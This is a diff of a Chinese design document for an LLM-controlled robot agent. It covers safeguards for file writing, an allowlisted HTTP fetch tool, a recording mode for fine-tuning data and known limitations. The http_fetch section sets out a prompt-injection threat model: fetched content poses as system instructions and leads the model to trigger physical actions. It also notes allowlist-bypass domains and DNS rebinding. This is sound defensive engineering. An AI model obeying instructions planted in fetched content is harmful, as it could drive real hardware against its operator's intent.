+    而不给 `--fs-root` 是配置错误，上电前退出 2。配置文件写 `allow_write_file` 一律拒绝
+    加载（只能命令行给，与第 1 条的 `allow_shell` 同判据）。
+    ② **后端下强制策略确认**：`--mcp-backend` 开 `--agent-write-file` 时，**强制**要有
+    `--agent-policy` 且其 `require_confirm` 包含 `write_file`（无人值守暴露改写主机文件的
+    能力必须有外部确认闸门，见第 11b 条同款机制；`list_dir`/`read_file` 只读、无此强制）。
+    写入走 `agent_sandbox.hpp` 的 `writeFileAtomic`（先写同目录临时文件，再落地；不留
+    半截内容）。**落地这一步按 `overwrite` 分成两条路**：`overwrite:true` 用 `rename`
+    （POSIX 原子替换）；`overwrite` 缺省或为 `false` 用 **`link` 而不是 `rename`**——
+    `rename` 对已存在目标是**无条件**原子替换，若在前置 `lstat` 之后、落地之前有另一个
+    写者抢先创建了目标，`rename` 会静默覆盖它（TOCTOU），彻底违反"不覆盖"的承诺；
+    `link` 的 POSIX 语义是"目标已存在则失败并置 `EEXIST`，否则原子创建"，才是"不存在才
+    创建"的正确原子判据（`rename` 没有对应的"仅当不存在才替换"变体）。
+    目标是符号链接**一律拒绝**（不跟随写入——跟随等于让根目录里的一条软链把
+    写操作重定向到根外，这比读泄漏更危险）；目标已存在时**默认拒绝覆盖**，须显式
+    `overwrite:true`（覆盖不可逆，旧内容不保留，与 `apply_sql` 的 `DELETE` 同一类风险，
+    故同样要求显式意图——`overwrite` 之于 `write_file` 相当于 `WHERE` 之于 `DELETE`）；
+    大小上限 64 KiB、内容含 NUL 拒绝、父目录不自动创建（`path` 的父目录必须已存在）；
+    落地文件权限 **0600**（不随 umask 放宽，与审计日志 / 会话文件 / REPL 历史同规）——
+    代价是别的用户或进程读不到写出来的文件，需要跨用户/跨进程共享时本工具不适用，
+    这一点也写进了模型可见的工具描述。
+    **已知限制**：不做 `fsync`（断电场景下"刚写完就断电"可能丢失这次写入，但落地
+    本身的原子性仍成立——不会出现"目标内容新旧混合"的半写状态）；不做版本历史/回滚
+    （覆盖前的旧内容不保留，如需回溯请在受版本控制的目录里使用 `--fs-root`）。
+
+15. **`http_fetch` 把外部网络主体引进模型上下文——白名单是唯一的门**（Phase 6，2026-10-08）。
+    此前所有工具的不可信输入都来自操作者自己放好的位置（`--fs-root` 下的文件、
+    `--camera-src` 的图片），攻击者要投毒得先拿到主机写权限；`http_fetch` 是**第一个**
+    把别的主机的响应体喂进上下文的工具。远端内容可以包含「假装是系统指令」的文本，
+    而 `> ` 定界加「数据不是指令」声明能**降低但不能消除**这个风险——定界是提示工程层面
+    的缓解，不是密码学边界。故：
+    ① **出站白名单是唯一的安全边界**，只能命令行 `--allow-host` 逐条给，精确匹配、无通配
+    （`*.example.com` 这类后缀匹配历史上反复被 `evil-example.com.attacker.net` 一类构造绕过，
+    宁可让操作者多敲几条）；配置文件不能开。**只放行你能为其内容负责的主机**——白名单里的
+    每个主机，等于获得了向这台机器人的模型说话的通道。
+    ② 只发 GET、不跟随重定向、不走系统代理、只收文本、体积边读边封顶（见「出站 HTTP」节）。
+    ③ **不强制策略确认**（维护者决定）：GET 无副作用，与 `read_file` 同级；把关全在白名单。
+    ④ **物理动作风险加一档**：模型读完响应、随后调 `run_action_script` / `apply_sql` /
+    `run_command` 的路径是开放的——代码层**不做**「本任务调过 `http_fetch` 就禁用动作工具」
+    的互斥（维护者决定）。在白名单主机的内容可能被他人影响（共享 wiki、第三方 API）的部署里，
+    请把动作工具的确认闸门（`--agent-policy` 的 `require_confirm`，见第 1 条与「策略钩子」节）
+    当作必需而不是可选；开 `BOT4CJ_ICA=1` 时，动作工具还须先过现实检查（本任务先读过机器人
+    状态、登记过预测），也能挡住「读完响应直接动作」的一步到位。
+    **已知限制**（如实声明）：
+    - **不过密钥遮蔽**：`maskSecretsInText`（第 1、13 条）只在 C++ 侧，Rust 侧没有镜像；
+      若白名单主机的响应里带凭据（例如某个调试接口回显了请求头），会原文进入上下文与
+      会话文件。只放行不会回显敏感数据的接口。
+    - **不防 DNS rebinding**：主机名白名单挡不住「白名单域名被改解析到内网地址」。若部署
+      网络里有不该被访问的内网服务，白名单里只放 IP 或受你控制解析的域名。
+    - **无专属限流**：同一任务里反复调 `http_fetch` 只受 `max_calls_per_round` 与任务墙钟
+      预算约束。
+    - 审计行的 `args.url` 去掉了查询串——要按查询参数复盘时只能看会话文件里的原始调用。
 
 ## 源码分层
 
@@ -775,7 +1248,7 @@ M6（正确/错误/无认证帧/空密钥拒启）、`agent_e2e.sh` R17（两进
 | `src/agentprompt.{hpp,cpp}` | 提示词素材单点（结构脚本头读取与 UTF-8 消毒、「数据非指令」定界 `quoteUntrusted`、总量上限常量；拼装在 Rust prompt.rs，语义逐字对齐） | 无 |
 | `src/promptpack.{hpp,cpp}` | 提示词包加载（目录展开、文件名自然排序、分节拼接、H2 根约束；与 Rust prompt.rs 同判据双实现） | 无 |
 | `src/mcpbackend.{hpp,cpp}` | 工具后端：AF_UNIX 帧服务、SO_PEERCRED、每连接预算、context.get 素材路由 | 无 |
-| `agent/src/repl.rs` 等 15 个 `.rs` | Rust agent：模型循环（REPL/--task）、终端行编辑（`linein.rs`，rustyline）、预算装饰器、历史裁剪、审计 model/session 行、帧客户端、**会话持久化**（`agent/src/session.rs`，批次 D 唯一实现，C++ 参考已清退）（`agent/`，Cargo 独立构建） | rig 0.42 |
+| `agent/src/repl/mod.rs` 等 35 个 `.rs` | Rust agent：模型循环（REPL/--task）、终端行编辑（`linein.rs`，rustyline）、预算装饰器、历史裁剪、审计 model/session 行（及本地工具的 tool 行）、帧客户端、本地工具 `http_fetch`（`agent/src/httpfetch.rs`，reqwest）、**会话持久化**（`agent/src/session.rs` + `session_store.rs`，批次 D 唯一实现，C++ 参考已清退）、**录制模式**（`agent/src/record.rs`：完整上下文采集含图片本体，微调数据用）（`agent/`，Cargo 独立构建；口径 `find agent/src -name '*.rs' \| wc -l`） | rig 0.42、reqwest 0.13 |
 | `modules/lib/json.lua` | Lua 侧严格 JSON 编解码 | 无 |
 | `modules/Camera.lua` | 摄像头驱动：V4L2 mmap + MJPEG（ffi），支持 `src` 模拟图片 | 无 |
 
@@ -816,7 +1289,8 @@ bash test/run_all.sh agent-all
     （AF_UNIX 帧）。覆盖工具循环、提示词包、审计轨迹、REPL 与能力门控、`--check-config`、
     单轮调用上限、限流重试、单次超时与 SIGINT 取消、图片后注、stdout 写失败不 panic、
     `--session-file`/`--resume` 两进程接力（批次 D）、流式逐 delta 到达与 `--llm-no-stream`
-    回退（R15：假服务按 150ms 帧间隔发 SSE，读端计时证明不是攒齐再打）；
+    回退（R15：假服务按 150ms 帧间隔发 SSE，读端计时证明不是攒齐再打）、录制模式与
+    训练集导出回路（R20：段布局/权限/事件时序/图片本体逐字节/三种方言/续接链/超限降级）；
   * `scripts/mcp_e2e.sh`——C++ 后端 + 纯标准库 Python 帧客户端直连 socket，守工具面与安全属性：
     `run_command`/`apply_sql`/`read_variables` 随开关进出 `tool.list`（正反两趟）、`apply_sql`
     带电生效与热删除、策略拒绝时零副作用、fd 卫生、socket 权限、审计与优雅停机。
@@ -828,6 +1302,18 @@ bash test/run_all.sh agent-all
 
 ## 已知限制
 
+- **录制模式的数据面如实声明**（2026-10-09，微调数据采集视角）：
+  ① **遮蔽痕迹会进数据集**——`run_command`/`read_file` 回执在进上下文前已被
+  `maskSecretsInText` 遮蔽（`***`），微调数据里就是遮蔽后的形态，模型会学到
+  「看到 `***` 是正常现象」；不想要这类样本请在导出后自行剔除。
+  ② **`http_fetch` 回执不遮蔽**（同审计已知限制），采集含外站内容的语料时注意。
+  ③ **分布偏差**：录制的是「这个提示词包 + 这套工具 + 这台机器人」下的轨迹；
+  导出器按 `system_fp` 拒绝串接提示词不同的段，手工混拼同样不被支持。
+  ④ **图片隐私**：录制段含真实画面（家里、人脸）与完整对话，敏感级高于会话
+  文件；0700/0600 + 命令行独占开启是全部防线，轮转/归档交给外部工具（append-only）。
+  ⑤ **磁盘占用**：图片仓缺省不限量（`--record-max-bytes` 兜底），小卡机器人请留意。
+  ⑥ **半截轮不入录制**：失败任务里被回滚的半截 tool_calls 序列不进事件流（与
+  会话文件同判据），其元数据在 `model_call`/`task_end` 事件里如实可见。
 - **流式面的边界**（2026-09-25）：见「流式与阻塞的如实偏差」——中途断流不重试、已打出的
   文本不撤回；思维链 delta 不打印；流式下 429 拿不到 `Retry-After`。`--llm-no-stream`
   退回阻塞面时长回答要等整轮生成完，帧间超时与整段超时都用 `--llm-timeout` 调整。
@@ -840,11 +1326,11 @@ bash test/run_all.sh agent-all
   驱动若阻塞在 ffi 系统调用里（`read()` / `ioctl()` / `usleep()` 不返回），VM 不派发
   指令、钩子没有执行机会——这一条无解。本仓库唯一能兜住「阻塞的 C 调用」的机制是
   子进程 + deadline + SIGKILL（`agent_subprocess`），但动作脚本必须在宿主进程内操作
-  已上电的硬件状态，走不了那条路。详见 `src/luaexec.hpp` 与 changelog。
+  已上电的硬件状态，走不了那条路。详见 `src/luaexec.hpp`（机制与 JIT 实测记录，出处提交 f46e5fc）。
 - 三个上下文字节预算（会话历史 `max_history_bytes`、任务内文本 `max_task_tool_result_bytes`、
   任务内图片 `max_task_image_bytes`）现可由**配置文件**覆盖（B1，2026-09-22，见上文
   「配置文件」字段表；缺省分别是 4 / 2 / 4 MiB）。`capture_image` 的单图 base64 硬上限 2 MiB
-  仍在 `src/agenttools.hpp`（编译期常量）。需要调优内存/上下文时先确认它们是不是你要找的那个数。
+  仍在 `src/agenttools_internal.hpp`（编译期常量）。需要调优内存/上下文时先确认它们是不是你要找的那个数。
 - 五个**运行期数值**（单轮调用数 `max_calls_per_round`、重试 `max_retries` / `retry_backoff_ms`、
   `run_command` 的 `run_command_timeout_sec` / `run_command_max_timeout_sec`）同样只在
   **配置文件**里可调（B4，2026-09-22）：它们刻意为**没有命令行选项**（选项面已 20+，
@@ -887,8 +1373,13 @@ bash test/run_all.sh agent-all
   **真的执行过**的调用出现——包括执行到一半失败的脚本（那种情况机器人可能停在半途）。
   这四类结果的字节数**仍然计入额度**。
 - **单任务墙钟预算（A4，缺省 900 秒）的三条确切边界**：
-  ① 判定点只有两处——**发起模型调用之前**与**一轮内逐条派发工具之前**，所以实际
-  超限量最多是「一次模型调用 + 一条工具」，不会是一整轮；② 预算耗尽时**已执行的
+  ① 模型/派发侧判定点只有两处——**发起模型调用之前**与**一轮内逐条派发工具之前**，所以实际
+  超限量最多是「一次模型调用 + 一条工具」，不会是一整轮；2026-09-30 起预算还贯穿到工具调用
+  **内部**：后端帧读侧的 deadline 同取本值（`frame::HARD_READ_CEILING`，`--llm-task-timeout 0`
+  = 不限时用 3700s 兜底 = 后端工具执行上限 + 余量）——后端进程活着但不回帧时任务不再无限挂起；
+  2026-10-01 起写侧同规（审计收口：读侧修了写侧漏了——后端活着但停止**读** socket 时，超过内核
+  socket 缓冲的请求帧写入同样无限挂起，8 MiB 上限下模型可控的大参数帧可必现；写侧 deadline
+  与读侧同值，单次调用的预算覆盖整个一发一收）；② 预算耗尽时**已执行的
   动作不回退**（硬件不会倒回去），报错文案与留在历史里的记录都如实说明这一点；
   ③ 若预算在一轮**中间**耗尽，剩余调用不派发、但每条各留一条「未派发（不是执行
   失败，也没有产生副作用）」的 tool 回执——`tool_calls` 与 `tool` 消息必须一一对应，
@@ -909,9 +1400,11 @@ bash test/run_all.sh agent-all
   以引用/流式形态穿过这条链），本版未做。小内存现场（树莓派 Zero 级）请留意：
   一次拍照的瞬时占用可达数十 MiB，而 OOM 会跳过 `deactivate()`。
 - ~~无记忆持久化（重启即忘）~~ → **已解决**（`--session-file` / `--resume`，
-  批次 D，Rust `mybot-agent` 实现，见「会话持久化」节）。
+  批次 D，Rust `mybot-agent` 实现，见「会话持久化」节）。2026-10-03 起更进一步：
+  **不给路径也缺省落盘**（`$MYBOT_HOME/robots/<机器人>/sessions/`）并默认续接上一次，
+  见「缺省落点与自动续接」小节。
   边界：图片不随会话恢复（以占位文本在列）；system 提示词/工具集/结构脚本变了会
-  拒绝恢复（指纹核对）。
+  拒绝恢复（指纹核对；缺省路径下改为告警并新开一段，显式 `--resume` 则退出 2）。
 - ~~只实现了两个 OpenAI 兼容协议驱动~~ → **已解决**（`LlmAnthropic` 协议族，批次 3，
   现与 OpenAI 兼容 / DeepSeek 三族一起内建于 Rust 侧 `agent/src/provider.rs`）。
   协议差异全部收敛在 rig 的 provider 实现里，接入非 OpenAI 形态的厂商在 Rust 侧
